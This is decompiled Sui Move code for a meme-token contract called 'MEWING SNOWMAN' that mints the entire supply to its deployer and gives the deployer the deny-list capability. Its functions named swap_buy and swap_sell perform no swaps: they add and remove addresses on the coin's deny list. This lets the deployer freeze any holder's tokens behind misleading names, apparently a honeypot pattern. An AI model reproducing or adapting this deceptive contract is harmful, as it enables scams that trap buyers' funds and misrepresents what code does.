module 0x3da19dc3ae0c3d367c77cf6c9e0395a7d0fabbdb95349c10f6042b95abb79cc9::mew {
    struct MEW has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: MEW, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MEW>(arg0, 9, b"MEW", b"MEWING SNOWMAN", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmSpFadi9iZp3jYKHdCwjGqmiDwvvt5VNXQ9JcxUGGBmgq"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<MEW>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MEW>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<MEW>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MEW>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MEW>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MEW>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MEW>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<MEW>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

